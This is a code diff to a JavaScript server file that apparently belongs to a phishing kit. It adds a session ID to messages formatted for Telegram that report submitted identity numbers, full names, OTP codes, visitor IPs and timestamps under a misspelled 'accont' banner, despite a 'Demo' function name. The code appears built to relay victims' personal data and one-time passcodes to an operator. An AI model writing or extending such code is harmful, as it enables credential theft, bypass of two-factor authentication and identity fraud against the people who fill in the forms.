@@ -64,6 +64,7 @@ const ALLOWED_PAGES = {
 const EVENT_ALIASES = {
   PAGE_OPENED: "PAGE_OPENED",
   FORM_SUBMITTED: "FORM_SUBMITTED",
+  SESSION_STARTED: "SESSION_STARTED",
   page_open: "PAGE_OPENED",
   form_submit: "FORM_SUBMITTED",
 };
@@ -236,6 +237,7 @@ function buildDemoFormSubmissionMessage(body, req) {
       "==============accont==============",
       `Page: ${escapeTelegramText(body.page)}`,
       "Event: FORM_SUBMITTED",
+      `Session ID: ${escapeTelegramText(body.sessionId)}`,
       `Status: ${body.validationStatus === "succeeded" ? "SUCCEEDED" : "FAILED"}`,
       `Required fields: ${body.requiredFields.complete ? "complete" : "incomplete"} (${body.requiredFields.filled}/${body.requiredFields.total})`,
       `Identity number:${fullname}`,
@@ -261,6 +263,7 @@ function buildDemoFormSubmissionMessage(body, req) {
       "==============accont==============",
       `Page: ${escapeTelegramText(body.page)}`,
       "Event: FORM_SUBMITTED",
+      `Session ID: ${escapeTelegramText(body.sessionId)}`,
       `Status: ${body.validationStatus === "succeeded" ? "SUCCEEDED" : "FAILED"}`,
       `Required fields: ${body.requiredFields.complete ? "complete" : "incomplete"} (${body.requiredFields.filled}/${body.requiredFields.total})`,
       `Full name:${fullName}`,
@@ -284,6 +287,7 @@ function buildDemoFormSubmissionMessage(body, req) {
       "==============accont==============",
       `Page: ${escapeTelegramText(body.page)}`,
       "Event: FORM_SUBMITTED",
+      `Session ID: ${escapeTelegramText(body.sessionId)}`,
       `Status: ${body.validationStatus === "succeeded" ? "SUCCEEDED" : "FAILED"}`,
       `Required fields: ${body.requiredFields.complete ? "complete" : "incomplete"} (${body.requiredFields.filled}/${body.requiredFields.total})`,
       `OTP code:${otpCode}`,
@@ -304,6 +308,7 @@ function buildDemoFormSubmissionMessage(body, req) {
     "==============accont==============",
     `Page: ${escapeTelegramText(body.page)}`,
     "Event: FORM_SUBMITTED",
+    `Session ID: ${escapeTelegramText(body.sessionId)}`,
     `Status: ${body.validationStatus === "succeeded" ? "SUCCEEDED" : "FAILED"}`,
     `Required fields: ${body.requiredFields.complete ? "complete" : "incomplete"} (${body.requiredFields.filled}/${body.requiredFields.total})`,
     `Identity number:${fullname}`,
@@ -332,6 +337,7 @@ function buildMessage(body, req) {
   return [
     `Page: ${escapeTelegramText(body.page)}`,
     `Event: ${eventType}`,
+    `Session ID: ${escapeTelegramText(body.sessionId)}`,
     `IP :${loggedIp}`,
     `Time: ${escapeTelegramText(body.timestamp)}`,
   ].join("\n");
